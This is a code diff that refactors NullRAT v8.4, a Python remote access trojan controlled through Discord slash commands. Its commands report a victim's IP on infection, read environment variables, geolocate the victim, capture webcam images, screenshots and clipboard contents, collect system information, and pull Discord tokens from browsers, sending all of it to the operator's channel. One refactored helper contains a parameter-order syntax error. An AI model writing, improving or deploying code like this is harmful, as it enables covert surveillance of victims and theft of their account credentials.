@@ -16,11 +16,12 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
 if os.path.isdir(nr_working) != True:
     os.mkdir(nr_working)
+ip_addr = IP()
     
 @client.event
 async def on_ready():
-    embed = Embed(
-        title = f"NullRAT v8.4 started on: **{IP()}**", 
+    embed = genEmbed(
+        title = f"NullRAT v8.4 started on: **{ip_addr}**", 
         description = f"Currently present in: **{original_dir}**",
         timestamp = datetime.now()
     )
@@ -35,23 +36,22 @@ async def on_ready():
     await client.get_channel(notification_channel).send(embed=embed)
 
 # Intelligence Gathering #
-@client.slash_command(name="listvictims", description="Finds the values of environment variables" )
-async def command(ctx):
+@client.slash_command(description="Finds the values of environment variables" )
+async def listvictims(ctx):
     await ctx.channel.send( 
-        embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}") 
+        embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {ip_addr}") 
     )
     await ctx.response.send_message("Checking all available victims...")
 
 
 @client.slash_command(
-    name="get_environment",
     description="Finds the values of environment variables",
     options=[
         discord.Option("victim", description="IP Address of specific victim", required=True),
         discord.Option("environment", description="The variable of which the value is wanted", required=True)
     ],
 )
-async def command(ctx, victim: str, environment: str):
+async def get_environment(ctx, victim: str, environment: str):
     if str(victim) == str(IP()):
         try: 
             value = os.getenv(environment)
@@ -78,13 +78,12 @@ async def command(ctx, victim: str, environment: str):
 
 
 @client.slash_command(
-    name="geolocate",
     description="Finds all geolocation information of victim",
     options=[
         discord.Option("victim", description="IP Address of specific victim", required=True),
     ],
 )
-async def command(ctx, victim):
+async def geolocate(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         
@@ -110,13 +109,12 @@ async def command(ctx, victim):
 
 
 @client.slash_command(
-    name="get_webcam",
     description="Capture image from webcam",
     options=[
         discord.Option("victim", description="IP Address of specific victim", required=True),
     ],
 )
-async def command(ctx, victim):
+async def get_webcam(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         
@@ -156,13 +154,12 @@ async def command(ctx, victim):
   
   
 @client.slash_command(
-    name="get_systeminfo",
     description="Sends General System Information",
     options=[
         discord.Option("victim", description="IP Address of specific victim", required=True),
     ],
 )
-async def command(ctx, victim):
+async def get_systeminfo(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         
@@ -187,13 +184,12 @@ async def command(ctx, victim):
 
 
 @client.slash_command(
-    name="get_screenshot",
     description="Sends screenshot of entire monitor",
     options=[
         discord.Option("victim", description="IP Address of specific victim", required=True),
     ],
 )
-async def command(ctx, victim):
+async def get_screenshot(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         
@@ -216,13 +212,12 @@ async def command(ctx, victim):
 
 
 @client.slash_command(
-    name="get_clipboard",
     description="Sends text contents of clipboard",
     options=[
         discord.Option("victim", description="IP Address of specific victim", required=True),
     ],
 )
-async def command(ctx, victim):
+async def get_clipboard(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
         
@@ -236,17 +231,28 @@ async def command(ctx, victim):
         await ctx.followup.send(embed=embed)
 
 
-@client.slash_command(description="Sends raw Discord Tokens (fast)")
-async def raw_tokens(ctx, victim):
+@client.slash_command(
+    description="Sends raw Discord Tokens from browsers (fast)",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+    ],
+)
+async def get_rawtokens(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
+        
         message, tokens = "", find_token()
         for token in tokens: 
             message += token + "\n"
-        if len(message) >= 1023: 
+        if len(message) >= 1000: 
             return await ctx.followup.send("```" + message + "```")
-        embed = Embed(title="Discord Tokens (NullRAT):", color=0x0081FA).add_field(name="RAW Tokens:", value=f"```{message.rstrip()}```")
-        embed.set_footer(text="Written by NullCode1337")
+        embed = discord.Embed(
+            title="Discord Tokens", timestamp=datetime.now()
+        ).add_field(
+            name="RAW Tokens:", 
+            value=f"```{message.rstrip()}```"
+        )
+        embed.set_footer(text="NullRAT")
         await ctx.followup.send(embed=embed)
 
 
@@ -525,11 +531,14 @@ def is_connected():
     try: create_connection(("1.1.1.1", 53)); return True
     except OSError: return False
 
-def EmbedGen(title_main, name, value):
-    color = 0x0081FA
-    embed = Embed(title=title_main, color=color)
-    embed.add_field(name=name, value=value)
-    embed.set_footer(text="Written by NullCode1337")
+def genEmbed(title, description=None, timestamp):
+    embed = discord.Embed(
+        title=title, 
+        description=description,
+        timestamp=timestamp
+    ).set_footer(
+        text="NullRAT"
+    )
     return embed
 
 def find_token():
